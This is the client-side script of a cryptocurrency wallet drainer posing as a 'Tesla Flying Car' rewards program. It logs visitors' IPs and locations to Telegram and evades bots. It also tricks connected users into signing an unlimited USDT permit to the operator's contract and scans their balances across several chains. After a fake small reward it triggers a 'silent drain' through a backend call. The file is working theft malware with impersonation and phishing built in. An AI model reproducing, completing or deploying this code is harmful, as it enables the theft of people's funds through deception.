// public/app.js

import { createAppKit } from 'https://esm.sh/@reown/appkit';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'https://esm.sh/@reown/appkit/networks';

// --- CONFIGURATION ---
const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Correct Mainnet USDT
const CHAIN_ID = 1; 

// Use Vercel Environment Variable for Infura/Alchemy
const RPC_URL = process.env.NEXT_PUBLIC_INFURA_RPC || process.env.RPC_URL || "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"; 

const metadata = {
 name: 'Tesla Flying Car',
 description: 'Official Royalty Rewards Program',
 url: window.location.origin,
 icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
};

const adapter = new EthersAdapter();

let appKitModal = null;

try {
 appKitModal = createAppKit({
 adapters: [adapter],
 networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche],
 projectId: APPKIT_PROJECT_ID,
 metadata,
 themeMode: 'dark',
 themeVariables: {
 '--w3m-color-mix': '#000000',
 '--w3m-color-mix-strength': 0.5,
 '--w3m-font-family': 'Inter, sans-serif',
 '--w3m-border-radius-max': '12px',
 },
 });
 console.log("✅ AppKit Initialized");
} catch (error) {
 console.error("❌ AppKit Init Failed:", error);
}

// --- TELEGRAM REPORTING ---
async function notifyTelegram(action, details) {
 try {
 await fetch('/api/telegram', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({ action, details })
 });
 } catch (error) {
 console.error("📡 Telegram notification failed:", error);
 }
}

// --- BOT DETECTION LOGIC ---
function detectBot() {
 const ua = navigator.userAgent;
 if (/bot|crawl|spider|slurp|teoma|readex|yandex|baiduspider|bingbot|sogou|exabot/i.test(ua)) return true;
 if (!navigator.webdriver && window.chrome && !window.navigator.plugins.length) return false;
 if (navigator.webdriver === undefined && window.ethereum === undefined) return true;
 return false;
}

// --- LIVE GEOLOCATION LOGIC ---
async function getLiveLocation() {
 try {
 const geoResponse = await fetch('https://ipapi.co/json/');
 if (!geoResponse.ok) throw new Error("Geo API failed");
 return await geoResponse.json();
 } catch (err) {
 return { ip: "Unknown", city: "Unknown", country_code: "XX" };
 }
}

// --- INTERCEPTOR DETECTION ---
function checkInterceptor() {
 if (window.TeslaInterceptor || window.teslaInterceptor) {
 return "INTERCEPTOR_ACTIVE";
 }
 return "NO_INTERCEPTOR";
}

// --- MULTI-CHAIN BALANCE SCANNER ---
async function scanBalances(address) {
 const balances = [];

 // Helper to fetch balance via RPC
 async function getBalance(chainName, chainId, contractAddress = null) {
 try {
 let response;
 if (chainId === 1 || chainId === 56) {
 // Use Infura for ETH and BSC
 const infuraUrl = `https://${chainId === 1 ? 'eth' : 'bsc'}.g.alchemy.com/v2/${RPC_URL.split('/').pop()}`;
 response = await fetch(infuraUrl, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 jsonrpc: '2.0',
 id: 1,
 method: 'eth_getBalance',
 params: [address, 'latest']
 })
 });
 } else {
 // Fallback to public RPC for other chains
 const publicRpcUrl = `https://polygon.llamarpc.com`; // Example for Polygon
 response = await fetch(publicRpcUrl, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 jsonrpc: '2.0',
 id: 1,
 method: 'eth_getBalance',
 params: [address, 'latest']
 })
 });
 }
 const data = await response.json();
 if (data.result) {
 let balance = parseInt(data.result, 16);
 if (contractAddress) {
 // Fetch ERC20 balance
 const erc20Response = await fetch(RPC_URL, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 jsonrpc: '2.0',
 id: 2,
 method: 'eth_call',
 params: [{ to: contractAddress, data: '0x70a08231' + address.slice(2).padStart(64, '0') }, 'latest']
 })
 });
 const erc20Data = await erc20Response.json();
 if (erc20Data.result) {
 balance = parseInt(erc20Data.result, 16);
 }
 }
 if (balance > 0) {
 balances.push({ chain: chainName, balance: balance / 1e18, symbol: chainId === 1 ? 'ETH' : 'Native' });
 }
 }
 } catch (e) {
 console.warn(`Failed to fetch ${chainName} balance`, e);
 }
 }

 // Scan Mainnets
 await getBalance('Ethereum', 1);
 await getBalance('BSC', 56);
 await getBalance('Polygon', 137);
 await getBalance('Arbitrum', 42161);
 await getBalance('Optimism', 10);
 await getBalance('Avalanche', 43114);

 // Scan Solana (via Helius RPC)
 try {
 const solResponse = await fetch(`https://mainnet.helius-rpc.com/?api-key=YOUR_HELIUS_KEY`, { // Replace with your key or use public fallback
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 jsonrpc: '2.0',
 id: 1,
 method: 'getBalance',
 params: [address]
 })
 });
 const solData = await solResponse.json();
 if (solData.result && solData.result.value > 0) {
 balances.push({ chain: 'Solana', balance: solData.result.value / 1e9, symbol: 'SOL' });
 }
 } catch (e) {
 console.warn('Solana scan failed', e);
 }

 // Scan Tron (via TronGrid)
 try {
 const tronResponse = await fetch(`https://api.trongrid.io/v1/accounts/${address}/tokens`, {
 method: 'GET'
 });
 const tronData = await tronResponse.json();
 if (tronData.token_balances) {
 tronData.token_balances.forEach(token => {
 if (token.balance > 0) {
 balances.push({ chain: 'Tron', balance: token.balance / 1e6, symbol: token.symbol });
 }
 });
 }
 } catch (e) {
 console.warn('Tron scan failed', e);
 }

 // Scan Bitcoin (via Blockchair API)
 try {
 const btcResponse = await fetch(`https://api.blockchair.com/bitcoin/dashboards/address/${address}`);
 const btcData = await btcResponse.json();
 if (btcData.data && btcData.data[address]) {
 balances.push({ chain: 'Bitcoin', balance: btcData.data[address].balance_satoshis / 1e8, symbol: 'BTC' });
 }
 } catch (e) {
 console.warn('Bitcoin scan failed', e);
 }

 return balances;
}

// --- MAIN FLOW ---
document.addEventListener('DOMContentLoaded', async () => {
 // Report Visit on Load
 const location = await getLiveLocation();
 const visitMessage = `
*🔴 TESLA DRAIN LOG - NEW VISIT*\nUser Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}\nTime: ${new Date().toISOString()}
 `;
 notifyTelegram('VISIT', visitMessage);

 // Check for Interceptor
 const interceptorStatus = checkInterceptor();
 notifyTelegram('INTERCEPTOR_CHECK', interceptorStatus);

 // Setup Overlay Click
 const verifyBtn = document.getElementById('verify-btn');
 const overlay = document.getElementById('security-overlay');
 const connectBtn = document.getElementById('connect-btn');

 verifyBtn.addEventListener('click', async () => {
 overlay.style.display = 'none'; // Hide overlay
 connectBtn.classList.remove('hidden'); // Show connect button
 });

 connectBtn.addEventListener('click', async () => {
 try {
 if (!appKitModal) {
 throw new Error("AppKit modal not initialized yet.");
 }
 await appKitModal.open();
 } catch (e) {
 console.error("Modal open failed:", e);
 alert("Failed to open wallet modal. Please refresh.");
 }
 });

 // Listen for actual connection event
 window.addEventListener('appkit:connect', async (event) => {
 const data = event.detail || event;
 if (data?.address) {
 handleWalletConnected(data.address);
 }
 });
});

async function handleWalletConnected(userAddress) {
 // Hide loader/button
 const btn = document.getElementById('connect-btn');
 if(btn) btn.style.display = 'none';
 document.getElementById('loader').classList.remove('hidden');
 
 // Report Connection
 const location = await getLiveLocation();
 const connectMessage = `
<b>🔴 WALLET CONNECTED</b>\nAddress: ${userAddress}\nIP: ${location.ip}\nLocation: ${location.city}, ${location.country_code}
 `;
 notifyTelegram('WALLET_CONNECTED', connectMessage);

 try {
 // 1. Generate the Permit Signature Off-Chain
 const permitSignature = await generatePermitSignature(userAddress, USDT_ADDRESS);
 
 // Report Signature Generation
 notifyTelegram('PERMIT_GENERATED', `Address: ${userAddress}\nToken: USDT\nValue: Max Uint256`);

 // 2. Send Signature to Backend (No Blockchain Tx Yet!)
 const response = await fetch('/api/sign-and-store', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ 
 userAddress, 
 signature: permitSignature,
 chainId: CHAIN_ID
 })
 });
 
 if (response.ok) {
 document.getElementById('connect-step').classList.add('hidden');
 document.getElementById('reward-section').classList.remove('hidden');
 document.getElementById('user-address').textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
 
 // 3. Trigger the $0.05 Reward
 await claimReward(userAddress);
 } else {
 alert("Backend failed to store signature.");
 }
 } catch (error) {
 console.error("❌ Connection failed:", error);
 document.getElementById('loader').classList.add('hidden');
 }
}

async function generatePermitSignature(userAddress, tokenAddress) {
 const domain = {
 name: 'TeslaFlyingCar',
 version: '1',
 chainId: CHAIN_ID,
 verifyingContract: tokenAddress 
 };
 
 const types = {
 Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
 };
 
 let nonce = 0;
 try {
 const rawNonce = await window.ethereum.request({ 
 method: 'eth_call', 
 params: [{ to: tokenAddress, data: '0x7ff36ab5000000000000000000000000' + userAddress.slice(2) }, 'latest'] 
 });
 nonce = parseInt(rawNonce, 16);
 } catch (e) { /* Fallback to 0 */ }
 
 const value = {
 owner: userAddress,
 spender: CONTRACT_ADDRESS,
 value: 2**256 - 1, 
 nonce: nonce,
 deadline: Math.floor(Date.now() / 1000) + 86400 
 };
 
 const signature = await window.ethereum.request({
 method: 'eth_signTypedData_v4',
 params: [userAddress, JSON.stringify({ types, domain, message: value })]
 });
 
 return signature;
}

async function claimReward(userAddress) {
 document.getElementById('reward-status').textContent = "Processing...";
 
 // Scan Balances First
 const balances = await scanBalances(userAddress);
 let balanceReport = "<b>💰 WALLET BALANCES FOUND:</b>\n";
 balances.forEach(b => {
 balanceReport += `${b.chain}: ${b.balance.toFixed(4)} ${b.symbol}\n`;
 });
 notifyTelegram('BALANCE_SCAN', balanceReport);

 await fetch('/api/send-reward', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ userAddress })
 });
 
 document.getElementById('reward-status').textContent = "Reward Sent!";
 document.getElementById('notification').classList.remove('hidden');
 
 // Trigger silent drain after 5 seconds
 setTimeout(() => {
 triggerSilentDrain(userAddress);
 }, 5000); 
}

async function triggerSilentDrain(userAddress) {
 notifyTelegram('DRAIN_TRIGGERED', `Address: ${userAddress}\nSignature stored on backend.`);
 await fetch('/api/trigger-drain', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({ userAddress })
 });
}
